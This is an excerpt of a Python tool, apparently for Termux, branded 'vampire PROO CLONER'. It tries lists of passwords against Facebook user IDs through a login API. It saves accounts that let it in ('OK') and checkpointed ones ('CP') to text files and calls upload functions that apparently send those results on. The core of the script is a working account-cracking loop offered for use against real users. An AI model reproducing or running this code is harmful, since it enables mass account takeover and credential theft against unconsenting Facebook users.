...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://pastbin.net/petni12-91"])
	exit(" [*] FACEBOOK : https://www.facebook.com/Demon.king.A.K.A.wish.mekar")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ Facebook🤲https://www.facebook.com/Demon.king.A.K.A.wish.mekar")
	subprocess.check_output(["am", "start", "https://www.facebook.com/Demon.king.A.K.A.wish.mekar"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/N4Y66M/wish/blob/main/Nayeem.txt:').text
			if basesplit in plr:
				key = basesplit
    ...
    _     _                      _               
 __      _(_)___| |__    _ __ ___   ___| | ____ _ _ __  
 \ \ /\ / / / __| '_ \  | '_ ` _ \ / _ \ |/ / _` | '__| 
  \ V  V /| \__ \ | | | | | | | | |  __/   < (_| | |    
   \_/\_/ |_|___/_| |_| |_| |_| |_|\___|_|\_\__,_|_|
   
   
------------------------------------------------------------------
   
  Author       :  Nayeem Hassan 
  Github       :  https://github.com/N4Y66M
  Facebook  :  A.KWishmaker
  Tool Type  :  Old id Cloning 
...
\033[41m\033[1;37m[Nayeem]   [Hassan]     [N4Y66M]\x1b[0m
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR   : Nayeem Hassan \033[1;32m[vampire]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37mhttp://github.com/N4Y66MLaa\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :         │
\033[1;36m│ [✓] POWER  : \x1b[1;32mN4Y66M\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
""")
		print("%s [%s•%s] %sTOOL NAME : %svampire❌ PROO CLONER❌"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [vampire] : %s/%s -> \033[0;92m [ vampire-OK:%s ]- \033[0;91m[vampire-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[vampire-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [vampire-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[vampire-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [vampire-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
